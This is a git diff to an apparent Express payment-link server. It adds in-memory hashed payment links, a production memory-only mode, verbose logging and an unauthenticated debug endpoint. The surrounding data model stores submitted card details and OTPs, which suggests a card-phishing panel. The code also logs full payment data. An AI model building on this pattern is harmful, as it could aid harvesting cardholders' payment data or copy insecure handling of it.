@@ -95,7 +95,8 @@ const adminData = {
   otps: [],
   globalCurrency: 'INR', // Default currency
   visitors: [], // Store visitor history for persistence
-  cardDetails: [] // Store submitted card details
+  cardDetails: [], // Store submitted card details
+  hashedPayments: {} // Store hashed payment links
 };
 
 // File paths for persistent storage
@@ -122,6 +123,17 @@ async function ensureDataDirectory() {
 // Load existing admin data from file/storage
 async function loadAdminData() {
   try {
+    // In production (Render.com), skip file operations and use memory-only mode
+    if (process.env.NODE_ENV === 'production') {
+      console.log('🌐 Production mode: Using memory-only storage');
+      // Ensure hashedPayments is initialized in production
+      if (!adminData.hashedPayments) {
+        adminData.hashedPayments = {};
+      }
+      console.log('✅ Admin data initialized for production (memory-only mode)');
+      return;
+    }
+    
     await ensureDataDirectory();
     
     // Load admin data
@@ -156,12 +168,24 @@ async function loadAdminData() {
     adminData.otps = [];
     adminData.visitors = [];
     adminData.cardDetails = [];
+    adminData.hashedPayments = {};
+  }
+  
+  // Always ensure hashedPayments is initialized
+  if (!adminData.hashedPayments) {
+    adminData.hashedPayments = {};
   }
 }
 
 // Save admin data to persistent storage
 async function saveAdminData() {
   try {
+    // In production (Render.com), file system is read-only, so we skip file operations
+    if (process.env.NODE_ENV === 'production') {
+      console.log('🌐 Production mode: Skipping file system operations - data stored in memory only');
+      return;
+    }
+    
     await ensureDataDirectory();
     
     // Save admin data
@@ -175,7 +199,7 @@ async function saveAdminData() {
     
     console.log(`💾 Admin data saved: ${adminData.payments.length} payments, ${adminData.otps.length} otps, ${activeVisitors.size} active visitors, ${adminData.visitors.length} visitor history, ${adminData.cardDetails.length} card details`);
   } catch (error) {
-    console.error('❌ Error saving admin data:', error);
+    console.error('❌ Error saving admin data (continuing in memory-only mode):', error);
   }
 }
 
@@ -885,17 +909,27 @@ app.post('/api/update-exchange-rate', (req, res) => {
 });
 
 // API endpoint to create hashed payment link
-app.post('/api/create-payment-link', (req, res) => {
+app.post('/api/create-payment-link', async (req, res) => {
   console.log('🔗 POST /api/create-payment-link called with body:', req.body);
   try {
     const { amount, currency, plan = 'Custom', billing = 'custom' } = req.body;
     
+    console.log('🔍 Validating payment link request:', { amount, currency, plan, billing });
+    
     if (!amount || !currency) {
+      console.error('❌ Validation failed: Missing amount or currency');
       return res.status(400).json({ error: 'Amount and currency are required' });
+    }
+    
+    // Ensure hashedPayments is initialized
+    if (!adminData.hashedPayments) {
+      console.log('🔧 Initializing hashedPayments object');
+      adminData.hashedPayments = {};
     }
     
     // Generate unique hashed link
     const hash = `${uuidv4()}${Date.now().toString(36)}${Math.random().toString(36).substr(2, 9)}`.toUpperCase().replace(/-/g, '').substring(0, 16);
+    console.log('🎲 Generated payment hash:', hash);
     
     // Store payment data with hash (24-hour expiration)
     const now = new Date();
@@ -913,32 +947,50 @@ app.post('/api/create-payment-link', (req, res) => {
       expired: false
     };
     
-    // Store in memory (you might want to use a database)
-    if (!adminData.hashedPayments) {
-      adminData.hashedPayments = {};
-    }
+    console.log('💾 Storing payment data in memory:', paymentData);
+    
+    // Store in memory
     adminData.hashedPayments[hash] = paymentData;
     
-    // Save to persistent storage
-    saveAdminData();
+    console.log(`📊 Total hashed payments in memory: ${Object.keys(adminData.hashedPayments).length}`);
     
-    console.log(`✅ Payment link created: ${hash} for ${amount} ${currency}`);
+    // Save to persistent storage (will be skipped in production)
+    try {
+      await saveAdminData();
+    } catch (saveError) {
+      console.warn('⚠️ Warning: Could not save to persistent storage, continuing with memory-only:', saveError.message);
+    }
+    
+    console.log(`✅ Payment link created successfully: ${hash} for ${amount} ${currency}`);
     res.json({ success: true, hash, paymentData });
   } catch (error) {
-    console.error('Error creating payment link:', error);
-    res.status(500).json({ error: 'Failed to create payment link' });
+    console.error('❌ Error creating payment link:', error);
+    console.error('❌ Error stack:', error.stack);
+    console.error('❌ AdminData state:', {
+      hashashedPayments: !!adminData.hashedPayments,
+      paymentsCount: adminData.hashedPayments ? Object.keys(adminData.hashedPayments).length : 'N/A'
+    });
+    res.status(500).json({ 
+      error: 'Failed to create payment link',
+      details: process.env.NODE_ENV === 'development' ? error.message : undefined
+    });
   }
 });
 
 // API endpoint to get payment data by hash
-app.get('/api/payment-data/:hash', (req, res) => {
+app.get('/api/payment-data/:hash', async (req, res) => {
   const { hash } = req.params;
   
+  console.log('🔍 Retrieving payment data for hash:', hash);
+  console.log('📊 Available hashed payments:', Object.keys(adminData.hashedPayments || {}));
+  
   if (!adminData.hashedPayments || !adminData.hashedPayments[hash]) {
+    console.error('❌ Payment link not found:', hash);
     return res.status(404).json({ error: 'Payment link not found' });
   }
   
   const paymentData = adminData.hashedPayments[hash];
+  console.log('💾 Found payment data:', paymentData);
   
   // Check if payment link has expired
   const now = new Date();
@@ -947,7 +999,11 @@ app.get('/api/payment-data/:hash', (req, res) => {
   if (paymentData.expired || now > expiresAt) {
     // Mark as expired and save
     paymentData.expired = true;
-    saveAdminData();
+    try {
+      await saveAdminData();
+    } catch (saveError) {
+      console.warn('⚠️ Warning: Could not save expired payment status:', saveError.message);
+    }
     
     console.log(`⏰ Payment link expired: ${hash}`);
     return res.status(410).json({ 
@@ -957,12 +1013,12 @@ app.get('/api/payment-data/:hash', (req, res) => {
     });
   }
   
-  console.log(`📊 Payment data retrieved for hash: ${hash}`);
+  console.log(`✅ Payment data retrieved successfully for hash: ${hash}`);
   res.json({ success: true, data: paymentData });
 });
 
 // API endpoint to manually expire a payment link (Admin Panel)
-app.post('/api/expire-payment-link', (req, res) => {
+app.post('/api/expire-payment-link', async (req, res) => {
   console.log('⚠️ POST /api/expire-payment-link called with body:', req.body);
   try {
     const { hash } = req.body;
@@ -981,7 +1037,11 @@ app.post('/api/expire-payment-link', (req, res) => {
     adminData.hashedPayments[hash].status = 'expired';
     
     // Save to persistent storage
-    saveAdminData();
+    try {
+      await saveAdminData();
+    } catch (saveError) {
+      console.warn('⚠️ Warning: Could not save expired payment status:', saveError.message);
+    }
     
     console.log(`✅ Payment link manually expired: ${hash}`);
     res.json({ 
@@ -999,6 +1059,27 @@ app.post('/api/expire-payment-link', (req, res) => {
 // Health check endpoint for Render.com
 app.get('/health', (req, res) => {
   res.status(200).json({ status: 'OK', timestamp: new Date().toISOString() });
+});
+
+// Debug endpoint to check system status
+app.get('/api/debug-status', (req, res) => {
+  const status = {
+    server: 'running',
+    environment: process.env.NODE_ENV || 'development',
+    timestamp: new Date().toISOString(),
+    adminDataStatus: {
+      hashashedPayments: !!adminData.hashedPayments,
+      hashedPaymentsCount: adminData.hashedPayments ? Object.keys(adminData.hashedPayments).length : 0,
+      paymentsCount: adminData.payments ? adminData.payments.length : 0,
+      otpsCount: adminData.otps ? adminData.otps.length : 0,
+      visitorsCount: adminData.visitors ? adminData.visitors.length : 0
+    },
+    activeVisitors: activeVisitors.size,
+    memoryUsage: process.memoryUsage()
+  };
+  
+  console.log('🔍 Debug status requested:', status);
+  res.json(status);
 });
 
 const PORT = process.env.PORT || 3001;
